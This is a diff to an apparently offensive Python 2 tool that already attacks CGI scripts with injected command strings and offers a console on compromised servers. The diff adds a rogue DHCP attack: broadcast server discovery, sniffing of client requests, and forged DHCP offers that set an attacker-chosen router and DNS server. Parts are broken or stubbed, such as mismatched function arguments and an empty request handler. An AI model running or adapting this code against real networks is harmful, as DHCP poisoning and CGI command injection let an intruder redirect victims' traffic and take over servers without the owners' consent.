@@ -58,6 +58,284 @@ class Unbuffered(object):
 # Wrap std.out in Unbuffered
 sys.stdout = Unbuffered(sys.stdout)
 
+# DHCP Request Types
+DHCP_REQUEST_TYPE = {
+    1: "DHCPDISCOVER",
+    2: "DHCPOFFER",
+    3: "DHCPREQUEST",
+    4: "DHCPDECLINE",
+    5: "DHCPACK",
+    6: "DHCPNAK",
+    7: "DHCPRELEASE",
+    8: "DHCPINFORM",
+    9: "DHCPFORCERENEW",
+    10: "DHCPLEASEQUERY",
+    11: "DHCPLEASEUNASSIGNED",
+    12: "DHCPLEASEUNKNOWN",
+    13: "DHCPLEASEACTIVE",
+    14: "DHCPBULKLEASEQUERY",
+    15: "DHCPLEASEQUERYDONE"
+    }
+
+# Text descriptions of DHCP parameters
+DHCP_PARAMETERS = {
+    0: "Pad",
+    1: "Subnet Mask",
+    2: "Time Offset",
+    3: "Router",
+    4: "Time Server",
+    5: "Name Server",
+    6: "Domain Server",
+    7: "Log Server",
+    8: "Quotes Server",
+    9: "LPR Server",
+    10: "Impress Server",
+    11: "RLP Server",
+    12: "Hostname",
+    13: "Boot File Size",
+    14: "Merit Dump File",
+    15: "Domain Name",
+    16: "Swap Server",
+    17: "Root Path",
+    18: "Extension File",
+    19: "Forward On/Off",
+    20: "SrcRte On/Off",
+    21: "Policy Filter",
+    22: "Max DG Assembly",
+    23: "Default IP TTL",
+    24: "MTU Timeout",
+    25: "MTU Plateau",
+    26: "MTU Interface",
+    27: "MTU Subnet",
+    28: "Broadcast Address",
+    29: "Mask Discovery",
+    30: "Mask Supplier",
+    31: "Router Discovery",
+    32: "Router Request",
+    33: "Static Route",
+    34: "Trailers",
+    35: "ARP Timeout",
+    36: "Ethernet",
+    37: "Default TCP TTL",
+    38: "Keepalive Time",
+    39: "Keepalive Data",
+    40: "NIS Domain",
+    41: "NIS Servers",
+    42: "NTP Servers",
+    43: "Vendor Specific",
+    44: "NETBIOS Name Srv",
+    45: "NETBIOS Dist Srv",
+    46: "NETBIOS Node Type",
+    47: "NETBIOS Scope",
+    48: "X Window Font",
+    49: "X Window Manager",
+    50: "Address Request",
+    51: "Address Time",
+    52: "Overload",
+    53: "DHCP Msg Type",
+    54: "DHCP Server Id",
+    55: "Parameter List",
+    56: "DHCP Message",
+    57: "DHCP Max Msg Size",
+    58: "Renewal Time",
+    59: "Rebinding Time",
+    60: "Class Id",
+    61: "Client Id",
+    62: "NetWare/IP Domain",
+    63: "NetWare/IP Option",
+    64: "NIS-Domain-Name",
+    65: "NIS-Server-Addr",
+    66: "Server-Name",
+    67: "Bootfile-Name",
+    68: "Home-Agent-Addrs",
+    69: "SMTP-Server",
+    70: "POP3-Server",
+    71: "NNTP-Server",
+    72: "WWW-Server",
+    73: "Finger-Server",
+    74: "IRC-Server",
+    75: "StreetTalk-Server",
+    76: "STDA-Server",
+    77: "User-Class",
+    78: "Directory Agent",
+    79: "Service Scope",
+    80: "Rapid Commit",
+    81: "Client FQDN",
+    82: "Relay Agent Information",
+    83: "iSNS",
+    84: "REMOVED/Unassigned",
+    85: "NDS Servers",
+    86: "NDS Tree Name",
+    87: "NDS Context",
+    88: "BCMCS Controller Domain Name list",
+    89: "BCMCS Controller IPv4 address option",
+    90: "Authentication",
+    91: "client-last-transaction-time option",
+    92: "associated-ip option",
+    93: "Client System",
+    94: "Client NDI",
+    95: "LDAP",
+    96: "REMOVED/Unassigned",
+    97: "UUID/GUID",
+    98: "User-Auth",
+    99: "GEOCONF_CIVIC",
+    100: "PCode",
+    101: "TCode",
+    102: "REMOVED/Unassigned",
+    103: "REMOVED/Unassigned",
+    104: "REMOVED/Unassigned",
+    105: "REMOVED/Unassigned",
+    106: "REMOVED/Unassigned",
+    107: "REMOVED/Unassigned",
+    108: "REMOVED/Unassigned",
+    109: "Unassigned",
+    110: "REMOVED/Unassigned",
+    111: "Unassigned",
+    112: "Netinfo Address",
+    113: "Netinfo Tag",
+    114: "URL",
+    115: "REMOVED/Unassigned",
+    116: "Auto-Config",
+    117: "Name Service Search",
+    118: "Subnet Selection Option",
+    119: "Domain Search",
+    120: "SIP Servers DHCP Option",
+    121: "Classless Static Route Option",
+    122: "CCC",
+    123: "GeoConf Option",
+    124: "V-I Vendor Class",
+    125: "V-I Vendor-Specific Information",
+    126: "Removed/Unassigned",
+    127: "Removed/Unassigned",
+    128: "PXE - undefined (vendor specific)",
+    129: "PXE - undefined (vendor specific)",
+    130: "PXE - undefined (vendor specific)",
+    131: "PXE - undefined (vendor specific)",
+    132: "PXE - undefined (vendor specific)",
+    133: "PXE - undefined (vendor specific)",
+    134: "PXE - undefined (vendor specific)",
+    135: "PXE - undefined (vendor specific)",
+    136: "OPTION_PANA_AGENT",
+    137: "OPTION_V4_LOST",
+    138: "OPTION_CAPWAP_AC_V4",
+    139: "OPTION-IPv4_Address-MoS",
+    140: "OPTION-IPv4_FQDN-MoS",
+    141: "SIP UA Configuration Service Domains",
+    142: "OPTION-IPv4_Address-ANDSF",
+    143: "Unassigned",
+    144: "GeoLoc",
+    145: "FORCERENEW_NONCE_CAPABLE",
+    146: "RDNSS Selection",
+    147: "Unassigned",
+    148: "Unassigned",
+    149: "Unassigned",
+    150: "TFTP server address",
+    151: "status-code",
+    152: "base-time",
+    153: "start-time-of-state",
+    154: "query-start-time",
+    155: "query-end-time",
+    156: "dhcp-state",
+    157: "data-source",
+    158: "OPTION_V4_PCP_SERVER",
+    159: "Unassigned",
+    160: "Unassigned",
+    161: "Unassigned",
+    162: "Unassigned",
+    163: "Unassigned",
+    164: "Unassigned",
+    165: "Unassigned",
+    166: "Unassigned",
+    167: "Unassigned",
+    168: "Unassigned",
+    169: "Unassigned",
+    170: "Unassigned",
+    171: "Unassigned",
+    172: "Unassigned",
+    173: "Unassigned",
+    174: "Unassigned",
+    175: "Etherboot",
+    176: "IP Telephone",
+    177: "Etherboot",
+    177: "PacketCable and CableHome",
+    178: "Unassigned",
+    179: "Unassigned",
+    180: "Unassigned",
+    181: "Unassigned",
+    182: "Unassigned",
+    183: "Unassigned",
+    184: "Unassigned",
+    185: "Unassigned",
+    186: "Unassigned",
+    187: "Unassigned",
+    188: "Unassigned",
+    189: "Unassigned",
+    190: "Unassigned",
+    191: "Unassigned",
+    192: "Unassigned",
+    193: "Unassigned",
+    194: "Unassigned",
+    195: "Unassigned",
+    196: "Unassigned",
+    197: "Unassigned",
+    198: "Unassigned",
+    199: "Unassigned",
+    200: "Unassigned",
+    201: "Unassigned",
+    202: "Unassigned",
+    203: "Unassigned",
+    204: "Unassigned",
+    205: "Unassigned",
+    206: "Unassigned",
+    207: "Unassigned",
+    208: "PXELINUX Magic",
+    209: "Configuration File",
+    210: "Path Prefix",
+    211: "Reboot Time",
+    212: "OPTION_6RD",
+    213: "OPTION_V4_ACCESS_DOMAIN",
+    214: "Unassigned",
+    215: "Unassigned",
+    216: "Unassigned",
+    217: "Unassigned",
+    218: "Unassigned",
+    219: "Unassigned",
+    220: "Subnet Allocation Option",
+    221: "Virtual Subnet Selection (VSS) Option",
+    222: "Unassigned",
+    223: "Unassigned",
+    224: "Reserved (Private Use)",
+    225: "Reserved (Private Use)",
+    226: "Reserved (Private Use)",
+    227: "Reserved (Private Use)",
+    229: "Reserved (Private Use)",
+    230: "Reserved (Private Use)",
+    231: "Reserved (Private Use)",
+    232: "Reserved (Private Use)",
+    233: "Reserved (Private Use)",
+    234: "Reserved (Private Use)",
+    235: "Reserved (Private Use)",
+    236: "Reserved (Private Use)",
+    237: "Reserved (Private Use)",
+    238: "Reserved (Private Use)",
+    239: "Reserved (Private Use)",
+    240: "Reserved (Private Use)",
+    241: "Reserved (Private Use)",
+    242: "Reserved (Private Use)",
+    243: "Reserved (Private Use)",
+    244: "Reserved (Private Use)",
+    245: "Reserved (Private Use)",
+    246: "Reserved (Private Use)",
+    247: "Reserved (Private Use)",
+    248: "Reserved (Private Use)",
+    249: "Reserved (Private Use)/Classless static route (Microsoft)",
+    250: "Reserved (Private Use)",
+    251: "Reserved (Private Use)",
+    252: "Reserved (Private Use)/Proxy auto discovery",
+    253: "Reserved (Private Use)",
+    254: "Reserved (Private Use)",
+    255: "End"
+    }
 
 # Dictionary {header:attack string} to try on discovered CGI scripts
 # Where attack string comprises exploit + success_flag + command
@@ -75,7 +353,6 @@ USER_AGENT = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
 def signal_handler(signal, frame):
     """ Try to catch and respond to CTRL-Cs
     """
-
     sys.exit(0)
 
 
@@ -84,11 +361,9 @@ def signal_handler(signal, frame):
 # HTTP/S Attacks
 #
 ###################
-
-
 def do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose):
-    """ The main funtion for http (and https) attacks. Accepts arguments passed in from the
-    command line and outputs to the command line.
+    """ The main funtion for http (and https) attacks. Accepts arguments passed
+    in from the command line and outputs to the command line.
     """
     # Check hosts resolve and are reachable on the chosen port
     confirmed_hosts = check_hosts(host_target_list, port, verbose)
@@ -205,10 +480,10 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
     if verbose: print "[+] Finished host scan"
     return exploit_targets
 
+
 def do_check_cgi(req, q, verbose):
     """ Worker thread for scan_hosts to check if url is reachable
     """
-
     try:
         if urllib2.urlopen(req, None, 5).getcode() == 200:
             q.put(req.get_full_url())
@@ -216,11 +491,11 @@ def do_check_cgi(req, q, verbose):
         if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
     finally:
         thread_pool.release()
+ 
 
 def do_exploit_cgi(proxy, target_list, header, command, verbose):
     """ For urls identified as potentially exploitable attempt to exploit
     """
-
     # Flag used to identify whether the exploit has successfully caused the
     # server to return a useful response
     success_flag = ''.join(
@@ -291,6 +566,7 @@ def do_attack(proxy, target, header, attack, verbose):
         pass
     return result
 
+
 def ask_for_console(proxy, successful_targets, verbose):
     """ With any discovered vulnerable servers asks user if they
     would like to choose one of these to send further commands to
@@ -298,7 +574,6 @@ def ask_for_console(proxy, successful_targets, verbose):
     successful_targets is a dictionary:
     {counter, (target, header, exploit)}
     """
-
     # Initialise to non zero to enter while loop
     user_input = 1
     while user_input is not 0:
@@ -359,7 +634,6 @@ def ask_for_console(proxy, successful_targets, verbose):
 def validate_address(hostaddress):
     """ Attempt to identify if proposed host address is invalid by matching
     against some very rough regexes """
-
     singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
     FQDN_pattern = re.compile('^(\w+\.)*\w+$')
     if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
@@ -372,7 +646,6 @@ def validate_address(hostaddress):
 def get_targets_from_file(file_name):
     """ Import targets to scan from file
     """
-
     host_target_list = []
     with open(file_name, 'r') as f:
         for line in f:
@@ -386,7 +659,6 @@ def get_targets_from_file(file_name):
 def import_cgi_list_from_file(file_name):
     """ Import CGIs to scan from file
     """
-
     cgi_list = []
     with open(file_name, 'r') as f:
         for line in f:
@@ -417,18 +689,21 @@ def print_progress(
 # DHCP Attacks
 #
 ###################
-
-
 def do_dhcp_attack():
     """ The main funtion for DHCP attacks. Accepts arguments passed in from the
     command line and outputs to the command line.
     """
     look_for_dhcp_servers()
-    poison_dhcp_clients()
+    while True:
+        dhcp_request = wait_for_dhcp_client_request()
+        poison_dhcp_client(dhcp_request)
 
 
 def look_for_dhcp_servers():
-
+    """Send a DHCPDISCOVER message to Ethernet broadcast and listen for servers
+    to respond
+    """
+    print "[+] Looking for DHCP servers on the network, please wait..."
     conf.checkIPaddr = False
     fam,hw = get_if_raw_hwaddr(conf.iface)
     randxid = random.randrange(1, 4294967295)
@@ -439,84 +714,117 @@ def look_for_dhcp_servers():
             DHCP(options=[
                 ("message-type","discover"),
                 ("end"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad"),
-                ("pad")
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad"),
+                ("pad"), ("pad"), ("pad"), ("pad")
                 ]),
-            verbose=0
+            verbose=0,
+            timeout=30,
+            multi=True
             )
     answered, unanswered = results
-    answer = answered[0][1]
-    print "[!] " + answer.summary()
-    print "[+] Server IP: %s" % answer[IP].src
-    print "[!] " + str(answer[DHCP].options)
-    for option in answer[DHCP].options:
-        print "[+] OPTION: " + str(option)
-    if answered[0][1][BOOTP].xid==randxid: print "[+] Replied received..."
+    result_size = len(answered)
+    print "results size is: %d" % result_size
+    if result_size > 0:
+        print "[I] Found: " + str(result_size)
+        answer = answered[0][1]
+        print "[!] " + answer.summary()
+        print "[+] Server IP: %s" % answer[IP].src
+        for option in answer[DHCP].options:
+            if type(option) == tuple:
+                print "[+] OPTION: " + str(option)
+    else: print "[I] None found"
 
 
-def poison_dhcp_clients():
-    pass
+def wait_for_dhcp_client_request():
+    print "[+] Waiting for DHCP requests..."
+    sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp)
+
+
+def process_dhcp(pkt):
+    options = get_dhcp_options(pkt)
+    request_type = DHCP_REQUEST_TYPE[options['message-type']] 
+    requested_paramaters = {}
+    print request_type 
+    print "DHCP options: %s" % str(options)
+    if options.has_key('param_req_list'):
+        requested_parameters = get_param_req_dict(options['param_req_list'])
+        print "Parameters requested: %s" % str(requested_parameters).strip('[]')
+    print "Command: %s" % str(pkt.command())
+    if request_type == "DHCPREQUEST":
+        print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
+        poison_dhcp_client(pkt, request_type, requested_parameters) 
+    print "-----------------------------------"
+
+
+def get_dhcp_options(pkt):
+    """Return a dictonary to DHCP options from the DHCP packet supplied
+    """
+    option_dictionary = {}
+    for option in pkt[DHCP].options:
+        if type(option) == tuple:
+            k ,v = option
+            option_dictionary[k] = v
+    return option_dictionary
+
+
+def get_param_req_dict(param_req_list):
+    """
+    """
+    parameter_dictionary = {}
+    for param in param_req_list:
+        try:
+            parameter_dictionary[ord(param)] = DHCP_PARAMETERS[ord(param)]
+        except:
+            parameter_dictionary[ord(param)] = "Unknown Option"
+    return parameter_dictionary
+    
+
+def poison_dhcp_client(pkt, request_type, requested_parameters):
+    """Send poisoned response to the client
+    """
+    if request_type == "DHCPDISCOVER":
+        sendp(Ether(src="00:12:12:12:12:12", dst="ff:ff:ff:ff:ff:ff")/
+            IP(src="10.10.10.1", dst="255.255.255.255")/
+            UDP(sport=67,dport=68)/
+            BOOTP(
+                op=2,
+                yiaddr='10.10.10.57',
+                siaddr='10.10.10.1',
+                giaddr='0.0.0.0',
+                chaddr=pkt[Ether].src,
+                xid=pkt[BOOTP].xid
+                )/
+            DHCP(options=[
+                    ('message-type', 2), 
+                    ('server_id', '10.10.10.1'), 
+                    ('lease_time', 18000), 
+                    ('subnet_mask', '255.255.255.0'), 
+                    ('router', '10.10.10.1'), 
+                    ('name_server', '10.10.10.1'), 
+                    ('domain', 'localdomain'), 
+                    ('broadcast_address', '10.10.10.255'), 
+                    'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
+                    ]
+                )
+            )
+
+    elif request_type == "DHCPREQUEST" or request_type == "DHCPINFORM":
+        pass
+
 
 def main():
     print """
